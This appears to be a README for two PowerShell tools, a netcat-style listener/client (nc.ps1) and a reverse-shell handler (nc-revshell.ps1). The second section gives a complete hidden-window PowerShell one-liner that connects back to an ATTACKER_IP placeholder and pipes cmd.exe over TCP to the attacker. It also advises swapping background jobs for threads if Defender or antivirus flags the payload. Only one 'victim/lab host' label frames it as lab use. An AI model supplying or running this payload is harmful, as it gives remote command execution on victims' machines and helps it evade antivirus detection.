## nc.ps1
### Usage Examples
Start a Listener (server mode)
``` .\nc.ps1 -Mode listen -Port 4444```

Connect to a Host (client mode)
```.\nc.ps1 -Mode connect -Host 10.50.0.61 -Port 4444 ```

🔹 Features
- Works interactively like nc for text.
- Server waits for one connection and spawns an interactive session.
- Async background job reads from the socket while you can type commands.
- Good for chat-style testing or simple reverse shell handling in labs.

⚠️ Limitations:
This version handles text only (line-based).
Doesn’t support UDP or raw binary streams like the real nc.
If you want reverse shell handling (executing commands), you’d need to extend it to call cmd.exe or powershell.exe with redirected streams.

## nc-revshell.ps1

### Usage (attacker):
``` .\nc-revshell.ps1 -Port 4444 ```

Target (victim/lab host) connect-back one-liner (PowerShell)
Replace ATTACKER_IP and PORT:
```
powershell -NoP -W Hidden -Command "$c=New-Object Net.Sockets.TcpClient('ATTACKER_IP',4444);$s=$c.GetStream();$p=New-Object Diagnostics.Process;$si=$p.StartInfo;$si.FileName='cmd.exe';$si.UseShellExecute=0;$si.RedirectStandardInput=1;$si.RedirectStandardOutput=1;$si.RedirectStandardError=1;$p.Start()|Out-Null;Start-Job{param($o,$n)$b=new-object byte[] 4096;while(($r=$o.BaseStream.Read($b,0,$b.Length)) -gt 0){$n.Write($b,0,$r);$n.Flush()}} -ArgumentList $p.StandardOutput,$s|Out-Null;Start-Job{param($e,$n)$b=new-object byte[] 4096;while(($r=$e.BaseStream.Read($b,0,$b.Length)) -gt 0){$n.Write($b,0,$r);$n.Flush()}} -ArgumentList $p.StandardError,$s|Out-Null;$b=new-object byte[] 4096;while(($r=$s.Read($b,0,$b.Length)) -gt 0){$p.StandardInput.BaseStream.Write($b,0,$r);$p.StandardInput.BaseStream.Flush()}"
```
Notes
This is TCP only, line/binary safe, and works well for Windows cmd.exe.
If you want PowerShell instead of cmd.exe, change FileName to powershell.exe.
If Defender/AV flags background jobs, swap jobs for threads/tasks; functionally identical.
